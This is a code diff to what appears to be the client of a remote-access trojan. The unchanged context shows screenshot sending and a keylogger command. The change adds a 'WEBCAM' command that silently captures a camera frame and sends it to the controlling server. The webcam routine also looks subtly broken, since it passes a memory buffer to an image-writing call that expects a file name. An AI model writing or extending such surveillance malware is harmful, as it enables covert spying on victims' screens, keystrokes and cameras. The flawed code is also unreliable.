@@ -18,6 +18,8 @@ import pyscreeze
 import requests
 from cryptography.fernet import Fernet
 
+import cv2
+
 if getattr(sys, 'frozen', False):
     CLIENT_PATH = os.path.dirname(sys.executable)
     os.chdir(CLIENT_PATH)
@@ -403,6 +405,21 @@ class Client(object):
                     continue
                 self.send(content)
                 logging.info('Sent Screenshot to Server')
+                continue
+
+            if data[0] == 'WEBCAM':
+                vc = cv2.VideoCapture(0)
+                s, img = vc.read()
+                if s:
+                    with BytesIO() as output:
+                        cv2.imwrite(output, img)
+                        content = output.getvalue()
+                    self.send(content)
+                    logging.info('Captured Webcam image')
+                    vc.release()
+                    continue
+                self.send(b'ERROR')
+                vc.release()
                 continue
 
             if data[0] == 'START_KEYLOGGER':
